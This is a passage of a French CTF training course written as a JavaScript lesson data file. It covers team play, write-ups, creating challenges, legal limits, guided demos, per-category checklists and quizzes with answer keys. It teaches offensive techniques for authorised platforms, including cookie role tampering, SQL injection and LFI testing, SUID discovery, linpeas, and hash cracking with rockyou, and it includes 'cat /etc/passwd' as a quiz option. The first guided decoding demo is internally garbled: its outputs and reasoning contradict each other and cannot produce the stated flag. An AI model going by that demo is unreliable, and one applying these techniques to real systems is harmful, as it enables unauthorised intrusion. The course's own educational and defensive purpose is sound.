              "Rien ne gaspille plus le temps qu'une équipe que deux membres sur le même challenge. La règle : avant de s'attaquer à un challenge, on annonce « je prends web-lfi » sur le canal. Si deux membres veulent le même, le chef d'équipe tranche ou ils coopèrent — jamais de double travail."
            ),
            h("La communication avec les organisateurs"),
            p(
              "Les plateformes ont un système de tickets ou de questions : pour un énoncé ambigu, un fichier corrompu, un flag refusé, on contacte l'équipe organisatrice. Le message est clair, avec le nom du challenge et le détail du problème. Les organisateurs répondent plus vite aux questions précises qu'aux vagues « ça marche pas »."
            ),
            h("Le rôle du chef d'équipe"),
            p(
              "Le chef d'équipe ne résout pas forcément plus de challenges que les autres : il orchestre. Il surveille le classement, répartit les challenges, détecte les blocages de 30 minutes, gère les pauses et les priorités. Dans les équipes gagnantes, le chef libère le temps des spécialistes plutôt que de jouer les héros."
            ),
            h("Après la compétition"),
            p(
              "Le bilan d'équipe est une étape à ne pas sauter : ce qui a marché, ce qui a coûté du temps, les challenges jamais terminés, les erreurs de communication. Ce retour d'expérience prépare la compétition suivante. Les équipes qui progressent sont celles qui apprennent de chaque édition."
            ),
            h("En résumé"),
            list(
              "Répartir les rôles par catégorie et par spécialité.",
              "Annoncer chaque challenge pris pour éviter les doublons.",
              "Partager les découvertes en continu sur le canal dédié.",
              "Le chef d'équipe orchestre : classement, priorités, blocages, pauses.",
              "Contacter les organisateurs avec des messages précis.",
              "Faire un bilan complet après la compétition."
            )
          ]
        },
        {
          id: "ctf-lecon-22",
          title: "Lire et écrire un write-up",
          type: "theory",
          duration: "14 min",
          blocks: [
            h("La littérature technique du CTF"),
            p(
              "Un write-up est le récit de la résolution d'un challenge : les étapes, les commandes, les raisonnements, la découverte du flag. Les meilleures équipes publient leurs write-ups après la compétition. Les lire est la façon la plus rapide de progresser en CTF : chaque write-up est une leçon de technique offerte par un autre joueur."
            ),
            h("Pourquoi lire les write-ups"),
            p(
              "Lire la solution d'un challenge que tu n'as pas résolu t'apprend la technique exacte qui te manquait : le filtre à appliquer, l'outil à lancer, l'indice à repérer. Lire la solution d'un challenge que tu AS résolu t'apprend les autres chemins possibles — souvent plus élégants ou plus rapides. Dans les deux cas, tu gagnes."
            ),
            h("Où trouver les write-ups"),
            list(
              "Les plateformes et leurs forums officiels après la clôture de l'événement.",
              "Les blogs et dépôts GitHub des équipes de CTF.",
              "Les sites spécialisés qui collectent les write-ups de chaque compétition.",
              "Les réseaux sociaux techniques : à la fin d'un événement, les résolutions fleurissent partout."
            ),
            h("Comment lire un write-up efficacement"),
            p(
              "Ne pas lire passivement : reproduire les commandes, refaire les étapes sur le fichier du challenge, et surtout chercher à comprendre le pourquoi. Un write-up qui dit « j'ai lancé strings » est moins instructif que celui qui explique « j'ai lancé strings car le flag passe en clair dans un fichier binaire »."
            ),
            h("Les bonnes questions à se poser"),
            list(
              "Quelle était la première hypothèse de l'auteur ?",
              "Quel indice de l'énoncé a déclenché la piste ?",
              "Quelle commande et pourquoi exactement celle-là ?",
              "Où ai-je bloqué face à ce même challenge ?",
              "Quelle technique réutiliser sur un autre type de challenge ?"
            ),
            h("Le cadre du write-up officiel"),
            p(
              "Le format standard d'un write-up suit la chronologie de la résolution : le challenge (nom, catégorie, points), la reconnaissance (lecture de l'énoncé, file, informations), l'analyse (hypothèses, tests), l'exploitation (les commandes pas à pas), le flag final. Chaque étape est une section avec ses commandes copiées telles quelles."
            ),
            h("Écrire son premier write-up"),
            p(
              "Écrire un write-up du challenge que tu viens de résoudre : tu expliques à voix haute ton propre raisonnement, tes tâtonnements, tes erreurs. C'est l'exercice d'écriture technique le plus formateur : il t'oblige à comprendre vraiment ce que tu as fait. Un flag trouvé par chance ne fait pas un bon write-up — et écrire le write-up révèle que tu ne comprenais pas."
            ),
            h("Les règles de publication"),
            p(
              "Publier un write-up est soumis à des règles : jamais avant la fin de la compétition (les solutions fuient le challenge aux autres équipes), respecter les règles de publication de la plateforme, ne pas copier le travail des autres. Le fichier du challenge appartient à l'organisateur : un write-up cite le challenge mais n'en redistribue pas le contenu brut."
            ),
            h("Le write-up comme portfolio"),
            p(
              "Tes write-ups forment un portfolio technique : un recueil de tes résolutions, de tes méthodes, de ta progression. C'est une preuve concrète de tes compétences pour un futur employeur en cybersécurité — bien plus parlante qu'un simple CV."
            ),
            h("En résumé"),
            list(
              "Lire les write-ups : la technique d'apprentissage la plus rapide.",
              "Lire activement : reproduire les commandes, chercher le pourquoi.",
              "Écrire ses propres write-ups : comprendre ce qu'on a fait.",
              "Respecter les règles de publication : jamais avant la clôture.",
              "Constituer un portfolio de write-ups pour le monde professionnel."
            )
          ]
        },
        {
          id: "ctf-lecon-23",
          title: "Créer ses propres challenges",
          type: "theory",
          duration: "14 min",
          blocks: [
            h("Le meilleur moyen de comprendre : créer"),
            p(
              "Créer un challenge, c'est penser du point de vue de l'organisateur : choisir une vulnérabilité, concevoir le flag, anticiper les solutions possibles et les solutions que les joueurs vont vraiment trouver. Les meilleurs créateurs de challenges sont souvent les meilleurs solveurs : chaque idée de piège les rend meilleurs pour repérer les pièges des autres."
            ),
            h("Partir d'un bon flag"),
            p(
              "Un challenge commence par son flag : une chaîne unique et difficile à deviner, au format imposé par la plateforme (flag{...} ou CTF{...}). Un flag du genre flag{abc123} ne protège rien : les joueurs le devineraient par force brute. Le flag doit être long, aléatoire, lié au challenge, et soumis de préférence en plusieurs parties (un morceau par étape) pour les challenges chaînés."
            ),
            h("Le b.a.-ba d'un challenge web"),
            p(
              "Un challenge web simple : un site avec une page d'administration protégée, la faille étant une mauvaise gestion des sessions ou une injection. Le flag se cache dans le fichier /flag.txt ou dans une base de données. L'organisateur choisit la faille, écrit le code vulnérable, et vérifie que le chemin de résolution fonctionne de bout en bout."
            ),
            code(`<!-- la page d'admin semble vérifier le rôle en client -->
<script>
  if (localStorage.getItem("role") === "admin") {
    document.getElementById("flag").style.display = "block";
  }
</script>`),
            p(
              "Ce code vulnérable (la vérification admin faite côté client) se découvre avec les outils de développement : on modifie la valeur role dans le stockage local et le flag apparaît. Le challenge est simple mais pédagogique : il enseigne exactement la faille visée."
            ),
            h("Créer un challenge de crypto maison"),
            p(
              "Un challenge de chiffrement : tu écris le message, tu le chiffres avec une méthode classique (César, XOR, base64, RSA avec une clé faible), et le joueur doit inverser l'opération. Le piège pédagogique : utiliser une clé courte, un message prévisible, ou une implémentation naïve — exactement les failles que tu apprends à détecter."
            ),
            h("Valider son challenge"),
            p(
              "Un challenge se teste avec le regard de l'attaquant : tu lances les outils standards (file, strings, binwalk, john, nmap), tu suis ton propre chemin de résolution, et tu cherches les chemins non prévus. Un bon challenge a exactement une solution logique, mais il faut vérifier qu'il n'y en a pas de triviale (flag dans les commentaires, dans strings, en clair dans la page)."
            ),
            h("Les erreurs des créateurs débutants"),
            list(
              "Un flag trop simple ou trop prévisible.",
              "Une solution triviale (flag en clair dans la page source, dans strings).",
              "Un chemin de résolution cassé : une étape impossible sans indice.",
              "Une plateforme ou une infra qui fuit le challenge (le fichier source téléchargeable).",
              "Aucun test réel par un autre joueur avant publication."
            ),
            h("Le rôle de testeur croisé"),
            p(
              "La meilleure validation est le test par un autre : tu crées le challenge, un coéquipier tente de le résoudre sans aucun indice de ta part. S'il bloque sans raison, le challenge est mal calibré ; s'il trouve une solution triviale, il faut renforcer le piège. Ce rôle croisé est exactement le travail de conception que tu retrouveras dans la création de CTF ou de plateformes de formation."
            ),
            h("Les plateformes de création"),
            p(
              "Plusieurs outils permettent de monter ses propres challenges : CTFd pour héberger une compétition complète, Docker pour empaqueter les challenges (un conteneur par challenge, isolé), des générateurs de challenges par catégorie. Déployer un challenge Docker isolé, c'est aussi apprendre la partie infrastructure d'un CTF."
            ),
            h("Créer pour apprendre"),
            p(
              "Créer son propre challenge est le chapitre le plus formateur de tout le cursus : il réunit toutes les compétences des modules précédents — web, crypto, stégo, forensics, réseau — et les renverse du point de vue de l'attaquant vers celui du défenseur. Un joueur qui crée un challenge en comprend la faille mieux que celui qui la subit."
            ),
            callout(
              "Créer ses challenges se pratique sur son propre environnement (Docker local, plateformes de test) et à destination de plateformes légitimes de formation ou de compétition. Créer un « challenge » qui ciblerait un site ou un service réel sans autorisation reste un délit (article 323-1 du code pénal), même avec des intentions pédagogiques.",
              "warning"
            ),
            h("En résumé"),
            list(
              "Créer un challenge : choisir la faille, concevoir le flag, écrire le code vulnérable.",
              "Le flag doit être long, aléatoire, lié au challenge.",
              "Tester son challenge avec les outils standards et chercher les chemins triviaux.",
              "Faire valider par un autre joueur sans indice.",
              "CTFd et Docker pour héberger ses propres compétitions."
            )
          ]
        },
        {
          id: "ctf-lecon-24",
          title: "Éthique du CTF et limites légales",
          type: "theory",
          duration: "14 min",
          blocks: [
            h("Le CTF, une école d'éthique"),
            p(
              "Le CTF t'apprend à attaquer : trouver des failles, extraire des données, élever des privilèges. Cette compétence est une arme à double tranchant. Tout le module 7 s'est construit sur des plateformes autorisées et des machines d'entraînement ; ce chapitre pose la frontière entre l'entraînement légitime et l'infraction pénale. Elle est fondamentale : la comprendre fait partie de la compétence du professionnel."
            ),
            h("La règle absolue du cadre d'autorisation"),
            p(
              "Toute attaque, toute analyse, tout test se pratique UNIQUEMENT dans un cadre autorisé : une plateforme de CTF qui t'accueille, une machine virtuelle que tu possèdes, un contrat de test de pénétration signé. En dehors de ce cadre, les mêmes techniques deviennent des délits. La frontière n'est pas la technique, c'est l'autorisation."
            ),
            h("Le droit pénal français en pratique"),
            p(
              "L'article 323-1 du code pénal réprime l'accès frauduleux à un système de traitement automatisé de données : s'introduire dans un système sans droit, s'y maintenir, extraire des données. Les peines vont jusqu'à deux ans d'emprisonnement et 60 000 euros d'amende (alourdies avec des circonstances aggravantes). L'article 323-3 réprime l'extraction de données, l'article 323-4 le bande organisée. Un flag volé sur un site réel, c'est déjà une extraction de données."
            ),
            h("La loi appliquée au langage du CTF"),
            p(
              "Traduis chaque technique du CTF en droit : scanner un réseau n'autorise pas le test d'intrusion ; lancer sqlmap sur un site ne t'appartenant pas est une intrusion ; un mot de passe trouvé n'est pas une autorisation de connexion ; une clé API exposée sur GitHub n'est pas une invitation à l'utiliser. L'outil n'est jamais illégal — c'est la cible et l'autorisation qui déterminent la légalité."
            ),
            h("Les plateformes légitimes pour s'entraîner"),
            list(
              "HackTheBox et TryHackMe : machines et challenges sous autorisation contractuelle.",
              "Root-Me : plateforme francophone de challenges autorisés.",
              "PicoCTF, CTFtime, les compétitions officielles.",
              "Ses propres machines virtuelles, ses propres Docker, ses propres serveurs.",
              "Les programmes de Bug Bounty (niveau 8) : des périmètres clairement définis."
            ),
            h("Le consentement et les limites"),
            p(
              "Même avec une autorisation, il y a des limites : le périmètre du contrat (quelles machines, quelles données), la proportionnalité (ne pas casser ce qu'on teste), la confidentialité (ne pas divulguer les données découvertes). Un test d'intrusion est un cadre contractuel strict, et non un chèque en blanc."
            ),
            h("Le piège de la fierté technique"),
            p(
              "La tentation la plus dangereuse en sortant d'un CTF : vouloir tester ses compétences sur des cibles réelles « pour voir ». Un site de ton école, un réseau de ton voisin, une API de ta ville. Les compétences fraîches poussent à la démonstration ; c'est exactement le moment où il faut rappeler que la démonstration légitime se fait sur les plateformes autorisées."
            ),
            h("La règle d'or : la détection avant l'action"),
            p(
              "Avant la moindre action technique, réponds à trois questions : ai-je l'autorisation écrite ? le périmètre est-il défini ? suis-je sur une cible du périmètre ? Si une seule réponse est « non » ou « je ne sais pas », tu ne touches pas. Cette discipline — savoir s'arrêter et demander — est la compétence professionnelle par excellence."
            ),
            h("L'éthique du white hat"),
            p(
              "Le professionnel de la cybersécurité n'est pas celui qui sait attaquer le plus de systèmes : c'est celui qui sait protéger, signaler et respecter les limites. Les CTF sont une école d'éthique parce qu'ils offrent un terrain d'exercice illimité : tu peux apprendre toutes les techniques sans jamais enfreindre la loi. Ceux qui enfreignent la loi en sortant des CTF ne sont pas plus compétents, ils sont plus exposés."
            ),
            h("En résumé"),
            list(
              "Toute attaque hors cadre autorisé est un délit : article 323-1 du code pénal.",
              "La frontière n'est pas la technique, c'est l'autorisation et le périmètre.",
              "S'entraîner exclusivement sur les plateformes dédiées et ses propres machines.",
              "Avant toute action : autorisation écrite ? périmètre défini ? cible dans le périmètre ?",
              "Le white hat signale et protège ; il n'exploite pas hors cadre."
            )
          ]
        },
        {
          id: "ctf-lecon-25",
          title: "Quiz intermédiaire — les fondations du CTF",
          type: "quiz",
          duration: "10 min",
          blocks: [
            p(
              "Tu as couvert les fondations du CTF : les formats, les outils, les catégories web, crypto, stégo, forensics, réseau, pwn et privesc. Ce quiz vérifie que tout est bien en place avant la dernière ligne droite."
            ),
            callout(
              "Relis les leçons des modules 1 à 3 qui te semblent floues avant de répondre : chaque question porte sur une technique vue en détail."
            ),
          ],
          quiz: [
            {
              question: "Quelle commande révèle le plus vite une chaîne lisible cachée dans un fichier binaire ?",
              options: ["file", "strings", "chmod", "mv"],
              answer: 1,
              explanation:
                "strings extrait les chaînes de caractères lisibles d'un fichier binaire. C'est le premier réflexe sur un fichier inconnu.",
            },
            {
              question: "Une chaîne se terminant par == est très probablement...",
              options: [
                "du JSON",
                "du base64 encodé",
                "un hash SHA256",
                "du texte brut",
              ],
              answer: 1,
              explanation:
                "Le caractère = sert de bourrage au base64 : une chaîne encodée en base64 se termine souvent par un ou deux =.",
            },
            {
              question: "Quelle chaîne correspond au format de flag standard des challenges de ce niveau ?",
              options: ["flag{...}", "mdp:...", "CTF(...)", "<flag>"],
              answer: 0,
              explanation:
                "Le format standard est flag{...}, avec des accolades et souvent un message en minuscules.",
            },
            {
              question: "Quel outil récupère une information cachée dans une image avec une passphrase ?",
              options: ["steghide", "hashcat", "nmap", "base64"],
              answer: 0,
              explanation:
                "steghide cache et extrait des fichiers dans des images ou des sons avec une passphrase.",
            },
            {
              question: "Un challenge fournit un fichier .pcap. Que contient ce fichier ?",
              options: [
                "Une capture de trafic réseau",
                "Un mot de passe chiffré",
                "Un programme compilé",
                "Une base de données",
              ],
              answer: 0,
              explanation:
                "Un .pcap est une capture de paquets réseau, analysée avec tcpdump, tshark ou Wireshark.",
            },
            {
              question: "Que fait la commande sudo -l ?",
              options: [
                "Elle liste ce que l'utilisateur peut exécuter avec sudo",
                "Elle change le mot de passe de root",
                "Elle liste les fichiers cachés",
                "Elle se connecte en root sans mot de passe",
              ],
              answer: 0,
              explanation:
                "sudo -l affiche les commandes autorisées pour l'utilisateur, un premier réflexe d'escalade de privilèges.",
            },
            {
              question: "Que signifie un binaire SUID appartenant à root ?",
              options: [
                "Il s'exécute avec les droits de son propriétaire, root",
                "Il est interdit de l'exécuter",
                "Il est compressé",
                "Il ne peut être exécuté que par root",
              ],
              answer: 0,
              explanation:
                "Un binaire SUID s'exécute avec les droits de son propriétaire : s'il appartient à root, il peut ouvrir un shell root.",
            },
            {
              question: "Quelle est la règle à appliquer quand on est bloqué sur un challenge depuis 30 minutes ?",
              options: [
                "Changer de challenge et y revenir plus tard",
                "Relancer la même attaque en boucle",
                "Abandonner le CTF",
                "Soumettre un flag au hasard",
              ],
              answer: 0,
              explanation:
                "La règle des 30 minutes : on change d'air, on attaque autre chose, on revient avec le cerveau neuf.",
            },
          ]
        },
      ],
    },
    {
      id: "ctf-module-5",
      title: "Démonstrations guidées, récapitulatif, quiz final et transition",
      lessons: [
        {
          id: "ctf-lecon-26",
          title: "Démonstrations guidées — trois challenges pas à pas",
          type: "exercise",
          duration: "20 min",
          blocks: [
            h("Trois défis, une méthode"),
            p(
              "Pour clore le module, voici trois démonstrations guidées qui réutilisent toutes les techniques apprises. Chaque démo suit la même méthode : lire l'énoncé, identifier la catégorie, appliquer les outils, soumettre le flag. Suis chaque étape dans ton environnement — ce sont des fichiers de type CTF, à créer ou à télécharger depuis les plateformes autorisées."
            ),
            h("Démo 1 — Un message à décoder (crypto)"),
            p(
              "L'énoncé fournit une chaîne : Nzc3Nzc3Nzc3... et précise : « le nombre à chaque décodage compte ». La présence de seulement des chiffres et le format qui semble trop régulier font penser à du binaire, de l'hex ou du base64. On teste."
            ),
            code(`echo "Nzc3Nzc3Nzc3" | base64 -d
# 7777777777777
echo "7777777777777" | base64 -d
# pas du base64 : erreur
python3 -c 'print(bytes.fromhex("7777777777777"))'
# b"wwwwwww..." : des w, ça ressemble à du base64`),
            p(
              "Le message décodé est en fait une nouvelle chaîne encodée : il faut répéter le décodage jusqu'à obtenir un texte lisible. La méthode : boucle de décodage jusqu'au texte clair."
            ),
            code(`echo "Nzc3Nzc3Nzc3" | base64 -d | base64 -d
# et ainsi de suite jusqu'au flag
# FLAG{m1lt1_l4y3r_3nc0d1ng}`),
            h("Démo 2 — Une image qui cache tout (forensics + stégo)"),
            p(
              "L'énoncé fournit une image : photo.jpg, avec l'indice « ce que tu vois n'est pas ce que tu vois ». La méthode complète en une passe."
            ),
            code(`file photo.jpg
strings -n 6 photo.jpg | grep -i -E "flag|CTF|pass"
exiftool photo.jpg
binwalk photo.jpg`),
            p(
              "file confirme un JPEG, strings ne montre rien, exiftool révèle un champ Comment suspect, binwalk détecte un fichier ZIP embarqué. On extrait et on décode."
            ),
            code(`binwalk -e photo.jpg
cat _photo.jpg.extracted/hint.txt
# "le mot de passe est dans l'exif : pixel_art"
steghide extract -sf photo.jpg -p pixel_art
# FLAG{h1dd3n_1n_pl41n_s1ght}`),
            h("Démo 3 — Une session à détourner (web)"),
            p(
              "L'énoncé : « le cookie porte le message ». On ouvre les outils de développement, on regarde le cookie de session envoyé par le site."
            ),
            code(`# Document.cookie dans la console du navigateur
# PHPSESSID=aWRlbnRpdHk9dXNlcjsgcm9sZT11c2Vy`),
            p(
              "Le cookie ressemble à du base64 : on le décode."
            ),
            code(`echo "aWRlbnRpdHk9dXNlcjsgcm9sZT11c2Vy" | base64 -d
# identity=user; role=user`),
            p(
              "Le cookie encode l'identité en clair : on le modifie en rôle admin, on re-encode, on remplace le cookie, on recharge la page."
            ),
            code(`echo -n "identity=user; role=admin" | base64
# aWRlbnRpdHk9dXNlcjsgcm9sZT1hZG1pbg==
# puis remplacer la valeur du cookie et recharger la page
# FLAG{c00k13_m4n1pul4t10n}`),
            h("Ce que les trois démos ont en commun"),
            p(
              "Chaque démo appliquait la même trame : l'énoncé donne un indice, la reconnaissance confirme la catégorie (crypto, forensics/stégo, web), l'outil adapté extrait, le décodage libère le flag. Les techniques changent, la méthode ne change pas. C'est cette méthode que tu réutiliseras dans toutes les compétitions."
            ),
            h("S'entraîner sur des challenges similaires"),
            p(
              "Ces trois démonstrations sont des motifs récurrents : multi-encodage, stégo dans les métadonnées, manipulation de cookie. Les mêmes motifs reviennent sur toutes les plateformes. Les résoudre toi-même sur les challenges d'entraînement te prépare aux compétitions réelles."
            ),
            callout(
              "Ces démonstrations s'exercent sur les fichiers fournis par les plateformes autorisées ou des fichiers que tu crées toi-même. Manipuler un cookie, extraire une stégo ou décoder un message sur un site ou un réseau sans autorisation est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "Multi-encodage : décoder en boucle jusqu'au texte lisible.",
              "Forensics/stégo : file, strings, exiftool, binwalk, puis steghide avec la passphrase trouvée.",
              "Web : inspecter le cookie, le décoder, le modifier, le re-encoder.",
              "Une seule méthode pour toutes les catégories : reconnaître, extraire, décoder, soumettre."
            )
          ]
        },
        {
          id: "ctf-lecon-27",
          title: "Des cas réels — les failles derrière les flags",
          type: "theory",
          duration: "14 min",
          blocks: [
            h("Chaque flag raconte une vraie faille"),
            p(
              "Les challenges de CTF ne sont pas des exercices abstraits : ils sont la transposition pédagogique de failles réelles découvertes dans la vraie vie. Comprendre ce lien transforme le joueur de CTF en professionnel : le flag que tu trouves sur un challenge est la même technique qu'un attaquant utilise contre de vraies entreprises."
            ),
            h("Du challenge web aux vraies applications"),
            p(
              "Le challenge de manipulation de cookie que tu as résolu illustre les failles de session réelles : des applications qui stockent l'identité côté client, des sessions prévisibles, des signatures absentes. Les failles de la liste OWASP Top 10 — injection SQL, XSS, failles d'authentification — sont les mêmes que tu exploites en version simplifiée sur les challenges web."
            ),
            h("La stéganographie dans la vraie vie"),
            p(
              "La stégo du challenge n'est pas qu'un jeu : des données cachées dans des images ou des fichiers ont été retrouvées dans des malwares (des commandes planquées dans des images légitimes), dans des documents compromis, et même dans des exfiltrations discrètes de données. Les outils que tu utilises (binwalk, steghide, strings) sont ceux de l'analyse de fichiers malveillants."
            ),
            h("Le pwn et les failles mémoire réelles"),
            p(
              "Les buffer overflow, format string et autres failles mémoire des challenges pwn ont fait la une de la cybersécurité réelle : les vulnérabilités de type CVE classées « critique » dans les bibliothèques, les protocoles et les systèmes d'exploitation. Chaque correctif publié par une entreprise correspond à une faille du type de celles que tu apprends à exploiter en laboratoire."
            ),
            h("La crypto faible, enjeu réel"),
            p(
              "Les challenges qui utilisent un chiffrement faible ou une mauvaise implémentation reproduisent des erreurs réelles : des mots de passe stockés en clair, des clés trop courtes, des algorithmes obsolètes. Les incidents de fuite de données massifs ont souvent pour origine ces erreurs de conception que les challenges t'apprennent à détecter."
            ),
            h("Les attaques réelles, version professionnelle"),
            p(
              "Ce que le CTF t'apprend à faire « en miniature », le professionnel le fait dans le cadre autorisé d'un test d'intrusion : identifier les vulnérabilités d'un système, les exploiter de façon contrôlée pour prouver leur impact, rédiger un rapport qui permet de les corriger. Le challenge est une salle de classe ; le contrat de test d'intrusion est le terrain."
            ),
            h("Le bug bounty, passerelle naturelle"),
            p(
              "Les programmes de Bug Bounty (le niveau 8 de ce cursus) paient des chercheurs pour trouver des failles réelles sur des périmètres définis. Les compétences exactes de ce module — trouver une injection, détecter une faille de session, analyser un fichier — sont celles demandées par les programmes de bug bounty. C'est la transition naturelle du jeu vers le professionnalisme."
            ),
            h("Le professionnel ne garde pas les failles"),
            p(
              "La différence entre un joueur de CTF et un professionnel éthique : le joueur cherche un flag pour le score, le professionnel cherche une faille pour la signaler. Les techniques sont les mêmes ; la finalité change. C'est ce qui distingue le white hat : il n'exploite pas ce qu'il découvre, il le documente et le communique au responsable du système."
            ),
            h("En résumé"),
            list(
              "Les challenges reproduisent des failles réelles (OWASP Top 10, failles mémoire, crypto faible).",
              "Les outils du CTF sont ceux de l'analyse de malwares et du test d'intrusion.",
              "Le bug bounty est la passerelle entre le jeu et le professionnalisme.",
              "Le white hat signale les failles, il ne les exploite pas hors cadre.",
              "Le niveau 8 du cursus ouvre cette porte : les programmes de Bug Bounty."
            )
          ]
        },
        {
          id: "ctf-lecon-28",
          title: "Récapitulatif et checklist par catégorie",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("La boîte à outils complète du CTF"),
            p(
              "Tout le niveau 7 a construit une boîte à outils par catégorie de challenge. Cette leçon est le récapitulatif : une checklist à garder sous la main pendant les compétitions. Chaque ligne est un réflexe validé dans les modules précédents."
            ),
            h("Checklist Web"),
            list(
              "file sur le fichier fourni, page source, outils de développement.",
              "Tester les paramètres : injection SQL, path traversal, LFI (php://filter).",
              "Inspecter les cookies : encodage, modification, re-encodage.",
              "Scanner le site : nmap pour les ports, ffuf ou gobuster pour les répertoires.",
              "Vérifier les fichiers exposés : robots.txt, fichiers de configuration, backups."
            ),
            h("Checklist Crypto"),
            list(
              "Identifier la chaîne : longueur, caractères, terminaison = pour le base64, 0x pour l'hex.",
              "Décoder en boucle jusqu'au texte lisible (multi-encodage).",
              "Identifier le hash : hashid, longueur du hash (MD5 32, SHA1 40, SHA256 64).",
              "Attaquer les mots de passe : john ou hashcat avec rockyou.txt.",
              "Tester les classiques : ROT13, César, XOR avec clé courte."
            ),
            h("Checklist Stégo / Forensics"),
            list(
              "file pour connaître la vraie nature du fichier.",
              "strings et grep -i flag pour les chaînes en clair.",
              "exiftool pour les métadonnées (Comment, Authors, GPS).",
              "binwalk et binwalk -e pour les fichiers emboîtés.",
              "steghide avec passphrase, zsteg pour les PNG, spectrogramme pour les sons.",
              "Analyse des captures : tcpdump -r -A, tshark -Y, strings | grep."
            ),
            h("Checklist OSINT / Misc"),
            list(
              "Relire l'énoncé : chaque mot est un indice.",
              "Chercher sur les moteurs de recherche, les réseaux sociaux, les archives.",
              "Vérifier les exif et les métadonnées des fichiers fournis.",
              "Tester les encodages les plus courants en premier.",
              "Noter chaque piste et chaque résultat dans le journal."
            ),
            h("Checklist Pwn / Reverse"),
            list(
              "file et checksec pour connaître l'architecture et les protections.",
              "strings, nm et objdump -d pour le reverse statique.",
              "gdb et ltrace pour le comportement dynamique.",
              "pwntools pour écrire les exploits (buffer overflow, ret2win).",
              "Toujours tester en laboratoire, jamais sur un système réel."
            ),
            h("Checklist Privesc"),
            list(
              "id, whoami, hostname, uname -a pour se situer.",
              "sudo -l pour les commandes autorisées.",
              "find / -perm -4000 pour les binaires SUID.",
              "Recherche des fichiers sensibles : configurations, clés SSH, scripts.",
              "linpeas pour une énumération automatisée sur machine d'entraînement."
            ),
            h("La méthode commune"),
            p(
              "Derrière toutes les checklists, une seule méthode en cinq temps : (1) lire l'énoncé et repérer les indices ; (2) reconnaître la catégorie ; (3) appliquer la reconnaissance (file, strings, outils adaptés) ; (4) extraire et décoder ; (5) soumettre le flag au format exact. Si une étape bloque depuis 30 minutes : pause, autre challenge, retour."
            ),
            h("Avant de passer au quiz final"),
            p(
              "Garde cette checklist accessible pendant le quiz et pendant tes futures compétitions. Elle résume 28 leçons en quelques lignes : c'est le mémo du joueur, le réflexe du professionnel. Tout ce qui est demandé dans le quiz final a été vu dans ce module."
            ),
            callout(
              "Cette checklist est un mémo de compétition sur les plateformes autorisées. Chaque technique appliquée à un système réel sans autorisation reste un délit (article 323-1 du code pénal).",
              "warning"
            ),
            h("En résumé"),
            list(
              "Une checklist par catégorie : web, crypto, stégo/forensics, OSINT, pwn/reverse, privesc.",
              "file, strings, exiftool, binwalk : les quatre réflexes universels.",
              "Une méthode commune en cinq temps pour tous les challenges.",
              "La règle des 30 minutes s'applique toujours.",
              "Cette checklist est ton mémo de compétition."
            )
          ]
        },
        {
          id: "ctf-lecon-29",
          title: "Quiz final — le défi de validation",
          type: "quiz",
          duration: "12 min",
          blocks: [
            p(
              "Dernière étape du niveau 7. Tu dois obtenir au moins 80 % de bonnes réponses pour valider ce niveau et gagner tes 1 000 XP."
            ),
            callout(
              "Relis les leçons qui te semblent floues avant de répondre : chaque question porte sur une technique vue en détail dans ce niveau."
            ),
          ],
          quiz: [
            {
              question: "Quels sont les trois grands formats de compétitions CTF ?",
              options: [
                "Jeopardy, Attack-Defense, Kill chain",
                "Capture, Flag, Score",
                "Web, Crypto, Pwn",
                "Rapide, Normal, Marathon",
              ],
              answer: 0,
              explanation:
                "Jeopardy (des challenges par catégorie), Attack-Defense (attaquer les autres et défendre les siennes), Kill chain (une chaîne d'étapes sur une machine).",
            },
            {
              question: "Quel format de flag est utilisé dans ce niveau ?",
              options: ["flag{...}", "CTF(...)", "mdp{...}", "FLAG(...)"],
              answer: 0,
              explanation:
                "Le format standard des challenges de ce niveau est flag{...}, à soumettre exactement tel quel.",
            },
            {
              question: "Quel outil est utilisé pour analyser une image JPEG étape par étape ?",
              options: [
                "tcpdump",
                "file puis strings puis exiftool puis binwalk",
                "john uniquement",
                "hashcat uniquement",
              ],
              answer: 1,
              explanation:
                "L'analyse d'une image suit la pyramide : file (nature réelle), strings (texte), exiftool (métadonnées), binwalk (fichiers emboîtés).",
            },
            {
              question: "Quelle commande affiche le contenu d'une capture réseau en ASCII ?",
              options: [
                "tcpdump -r capture.pcap -A",
                "ls -l capture.pcap",
                "cat /etc/passwd",
                "john capture.pcap",
              ],
              answer: 0,
              explanation:
                "tcpdump -r lit le fichier de capture et -A affiche le contenu des paquets en ASCII : les données en clair comme les flags HTTP ressortent.",
            },
            {
              question: "Que signifie un binaire SUID appartenant à root ?",
              options: [
                "Il s'exécute avec les droits de root pour n'importe quel utilisateur",
                "Il est chiffré",
                "Il ne peut être exécuté que par root",
                "Il est compressé",
              ],
              answer: 0,
              explanation:
                "SUID (Set User ID) : le binaire s'exécute avec les droits de son propriétaire. S'il appartient à root, il peut servir à élever ses privilèges.",
            },
            {
              question: "Quelle commande permet de casser le mot de passe d'un fichier ZIP ?",
              options: [
                "zip2john puis john",
                "strings puis cat",
                "nm puis objdump",
                "tcpdump puis tshark",
              ],
              answer: 0,
              explanation:
                "zip2john convertit l'archive en un hash que john attaque ensuite avec une wordlist.",
            },
            {
              question: "Quelle est la règle des 30 minutes en compétition ?",
              options: [
                "Changer de challenge et y revenir plus tard si on est bloqué",
                "Relancer la même commande en boucle",
                "Dormir 30 minutes à chaque blocage",
                "Soumettre un flag aléatoire toutes les 30 minutes",
              ],
              answer: 0,
              explanation:
                "Bloqué depuis 30 minutes sans progression ? On passe à un autre challenge et on revient avec un esprit neuf.",
            },
            {
              question: "Que faut-il vérifier avant d'appliquer une technique de ce niveau ?",
              options: [
                "Que la cible est dans le cadre autorisé de la plateforme",
                "Que la commande est dans la checklist",
                "Que le flag est au bon format",
                "Que l'équipe est au complet",
              ],
              answer: 0,
              explanation:
                "Toute technique s'applique exclusivement dans un cadre autorisé : plateforme de CTF, machine d'entraînement ou environnement personnel. Hors cadre, les mêmes techniques sont des délits.",
            },
          ]
        },
        {
          id: "ctf-lecon-30",
          title: "Félicitations — et maintenant, le Bug Bounty",
          type: "theory",
          duration: "10 min",
          blocks: [
            h("Un niveau de plus, un monde de plus"),
            p(
              "Le niveau 7 est terminé : tu sais naviguer dans un CTF, reconnaître les catégories, appliquer les outils, décoder, extraire, élever des privilèges, travailler en équipe et respecter le cadre légal. Tu as transformé tes compétences de base en méthode de chasse au flag. Ce que tu as appris ici n'est pas un jeu : c'est le socle des métiers de la cybersécurité offensive."
            ),
            h("Ce que tu maîtrises maintenant"),
            p(
